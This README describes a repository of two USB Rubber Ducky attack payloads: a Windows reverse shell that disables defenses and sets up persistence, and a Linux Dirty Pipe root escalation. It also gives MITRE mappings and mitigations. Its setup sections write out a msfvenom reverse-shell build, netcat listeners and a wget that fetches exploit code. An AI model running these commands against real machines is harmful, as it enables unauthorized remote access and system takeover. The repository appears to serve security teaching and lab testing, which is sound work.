# USB Rubber Ducky Attack Scripts

## ⚠️ DISCLAIMER

These scripts are provided for **educational and research purposes only**. 

**DO NOT use these scripts for:**
- Unauthorized access to computer systems
- Malicious activities
- Any illegal purposes

By using these scripts, you agree to use them only in authorized, controlled environments and accept full responsibility for your actions.

---

## Overview

This repository contains two USB Rubber Ducky keystroke injection attack payloads demonstrating common security vulnerabilities:

### Attack 1: Windows Reverse Shell
- **Target:** Windows 10/11
- **Technique:** PowerShell-based security control bypass
- **Objective:** Disable defenses, establish remote access, create persistence

### Attack 2: Linux Privilege Escalation
- **Target:** Ubuntu Linux (Kernel 5.8 - 5.16.11)
- **Technique:** CVE-2022-0847 (Dirty Pipe) exploitation
- **Objective:** Gain root access, establish persistent backdoor

---

## Usage

### Prerequisites
- USB Rubber Ducky or Raspberry Pi Pico
- Attacker machine (Kali Linux recommended)
- Target virtual machines for testing
- Proper authorization for security testing

### Attack 1 Setup
```bash
# Generate payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=1337 -f exe -o shell.exe

# Start web server
python3 -m http.server 8000

# Start listener
nc -lvnp 1337
```

### Attack 2 Setup
```bash
# Download Dirty Pipe exploit
wget https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c -O dirty.c

# Start web server
python3 -m http.server 8080

# Start listener
nc -lvnp 4444
```

---

## MITRE ATT&CK Mapping

### Attack 1
- T1200 - Hardware Additions
- T1059.001 - PowerShell
- T1562.001 - Impair Defenses
- T1105 - Ingress Tool Transfer
- T1547.001 - Registry Run Keys / Startup Folder

### Attack 2
- T1200 - Hardware Additions
- T1068 - Exploitation for Privilege Escalation
- T1543.002 - Systemd Service
- T1070.003 - Clear Command History

---

## Mitigations

### Attack 1
- USB device whitelisting via Group Policy
- Enable Windows Defender Tamper Protection
- PowerShell Constrained Language Mode
- Endpoint Detection and Response (EDR)
- Mandatory screen lock policies

### Attack 2
- **Critical:** Update kernel to 5.16.12 or newer
- Implement USBGuard for USB filtering
- Enforce SELinux or AppArmor
- Configure auditd for system monitoring
- Deploy file integrity monitoring (AIDE/Tripwire)
- Implement egress firewall rules

---

## Legal Notice

**These tools are provided "as-is" for educational purposes only.**

The author:
- Does not condone illegal or unethical use
- Is not responsible for misuse or damage
- Provides no warranty of any kind

**Unauthorized access to computer systems is illegal.** Always obtain proper authorization before conducting security assessments.

---

## 📝 License

MIT License - See LICENSE file for details
